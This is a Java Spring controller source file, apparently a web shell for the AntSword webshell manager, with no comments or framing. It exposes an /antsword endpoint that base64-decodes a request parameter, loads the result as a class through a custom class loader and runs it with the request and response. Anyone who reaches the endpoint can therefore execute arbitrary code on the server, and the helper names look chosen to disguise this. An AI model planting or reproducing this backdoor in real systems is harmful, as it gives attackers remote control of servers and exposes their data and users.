package com.test;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import java.lang.reflect.Method;
import java.util.HashMap;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import sun.misc.BASE64Decoder;



@RestController
@Controller
public class Antsword {
    class ADDRESS extends ClassLoader{
        ADDRESS(ClassLoader c){super(c);}
        public Class unqualfied(byte[] b){
            return super.defineClass(b, 0, b.length);
        }
    }
    public byte[] polymorphic(String str) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64=Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception e) {
            try {
                base64=Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception ee) {}
        }
        return value;
    }


    @RequestMapping("/antsword")
    public void test(HttpServletRequest request, HttpServletResponse servletResponse) {
        try {
            String cls = request.getParameter("antsword");
            if (cls != null) {
                new ADDRESS(this.getClass().getClassLoader()).unqualfied(polymorphic(cls)).newInstance().equals(new Object[]{request,servletResponse});
            }
        } catch (Exception var13) {
            var13.printStackTrace();
        }
    }
}
